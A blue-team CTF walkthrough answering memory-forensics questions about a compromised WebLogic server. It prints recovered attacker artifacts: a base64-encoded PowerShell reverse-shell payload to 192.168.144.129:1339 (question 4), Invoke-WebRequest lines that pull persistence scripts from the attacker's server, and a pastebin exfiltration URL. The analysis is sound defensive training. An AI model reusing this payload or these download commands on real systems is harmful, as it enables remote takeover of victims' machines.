# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/weblogic/">WebLogic</a>

**Platform:** CyberDefenders

**Scenario:** The #NSM gear flagged suspicious traffic coming from one of the organization's web servers. As a soc analyst, analyze the server's captured memory logs files and figure out what happened.

**Category:** Endpoint Forensics

**Difficulty:** Medium

**Files:** `N/A`

**Tools:** `Volatility` `CobaltStrikeParser`

**Note:** In this walkthrough, CyberDefenders offers a lab environment for us to utilize. This feature is included with the PRO subscription.

## **Preparations** 

![image](https://github.com/user-attachments/assets/e651d0b7-f69c-485a-97e5-3361fdda03ba)

https://blog.onfvp.com/post/volatility-cheatsheet/

![image](https://github.com/user-attachments/assets/145204b0-0838-4561-ab9d-28debfc9bb82)

![image](https://github.com/user-attachments/assets/b8920fe9-c0c3-4f62-8d2c-870441590b18)

![image](https://github.com/user-attachments/assets/072a20f0-3f60-4984-999f-8923b3518d5f)

![image](https://github.com/user-attachments/assets/7c2e2720-e128-4691-aae4-0e8d34945ed8)

The VM is slow
  
## **Questions and Answers**

***1. What is the version of the WebLogic server installed on the system?***

~/Desktop/"Start Here"/Tools/volatility3/vol.py -f memory.mem windows.memmap --dump --pid 4752

![image](https://github.com/user-attachments/assets/87da3d43-217f-4c63-b1c5-89db2b161185)

strings pid.4752.dmp | grep -E "weblogic.*version" > version.txt

![image](https://github.com/user-attachments/assets/cd88d06a-a96e-4564-8bb3-5cf2293a3e0b)

strings pid.4752.dmp | grep -E "version" > version1.txt

![image](https://github.com/user-attachments/assets/99b7f9cc-a81a-4909-a394-a535ffe271f9)


***2. The admin set a port forward rule to redirect the traffic from the public port to the WebLogic admin portal port. What is the public and WebLogic admin portal port number? Format PublicPort:WebLogicPort (22:1337)***

80:7001

![image](https://github.com/user-attachments/assets/56cf3234-3b1f-41b9-9f25-4ccb433c5e48)

port 80 because of http request

***3. The attacker gained access through WebLogic Server. What is the PID of the process responsible for the initial exploit?***

4752

***4. The attacker used the vulnerability he found in the webserver to execute a reverse shell command to his own server. Provide the IP and port of the attacker server? Format: IP:port***

192.168.144.129:1339

![image](https://github.com/user-attachments/assets/b9d715c8-47bf-40ff-af07-19d93098a2de)

![image](https://github.com/user-attachments/assets/27bdbc34-8c19-4439-9627-63cde1bae0c0)

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

![image](https://github.com/user-attachments/assets/bd3d5f62-2bf0-4c6b-bcd6-4cf56df7e38c)

***5. Multiple files were downloaded from the attacker's web server. Provide the command used to download the PowerShell script used for persistence?***
![image](https://github.com/user-attachments/assets/ba77c02f-f9dc-4c14-95aa-524cb7aa2414)

Invoke-WebRequest -Uri "http://192.168.144.129:1338/pastebin.ps1" -OutFile "./pastebin.ps1"

Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile "./presist.ps1"

strings pid.4344.dmp | grep -E "\.ps1" > 4344.txt

***6. What is the MITRE ID related to the persistence technique the attacker used?***
![image](https://github.com/user-attachments/assets/aab4ab0e-23e5-4eb7-9829-715e975911bf)

2688	mmc.exe	"C:\Windows\system32\mmc.exe" "C:\Windows\system32\taskschd.msc" /s

T1053.005

https://attack.mitre.org/techniques/T1053/005/

***7. After maintaining persistence, the attacker dropped a Cobalt Strike beacon. Try to analyze it and provide the User-Agent.***

![image](https://github.com/user-attachments/assets/d1152e93-04ff-4591-a41b-6b185d6b6331)
~/Desktop/"Start Here"/Tools/volatility3/vol.py -f memory.mem windows.memmap --dump --pid 1488

![image](https://github.com/user-attachments/assets/52984636-c9ed-4144-b0e6-805896a40c7b)

python3 parse_beacon_config.py ~/Desktop/Start\ Here/Artifacts/MemProcFS\ Output/malfind/pid.1488.vad.0x3160000-0x355ffff.dmp 
![image](https://github.com/user-attachments/assets/5b9ecd6e-0666-4b00-b6a0-445b6ac38740)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) LBBROWSER

![image](https://github.com/user-attachments/assets/4a6d615e-2f3d-495c-b50b-d5d7f68c1233)


***8. What is the URL of the exfiltrated data?***

![image](https://github.com/user-attachments/assets/8da0a646-530d-41c0-9372-bcd747dc6ce8)

https://pastebin.com/A0Ljk8tu

